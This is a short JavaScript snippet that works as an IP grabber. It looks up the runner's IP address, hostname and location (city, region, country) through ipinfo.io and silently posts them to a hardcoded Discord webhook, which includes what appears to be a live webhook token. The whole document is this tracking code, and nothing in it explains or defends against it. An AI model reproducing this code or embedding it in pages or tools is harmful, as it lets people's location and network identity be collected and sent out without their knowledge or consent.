const url = 'https://discord.com/api/webhooks/1212783329212891228/AF4iNB266F_xuKXVYbvK9GPU8dyyHBDAqMnapN_R-_e4EV3JaxHnDpNAQdiMSRqJMbdX';

fetch('https://ipinfo.io/json')
  .then(response => response.json())
  .then(data => {
    const message = `
      IP: ${data.ip}
      Hostname: ${data.hostname}
      City: ${data.city}
      Region: ${data.region}
      Country: ${data.country}
    `;

    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ content: message }),
    });
  })
  .catch(error => console.error('Error:', error));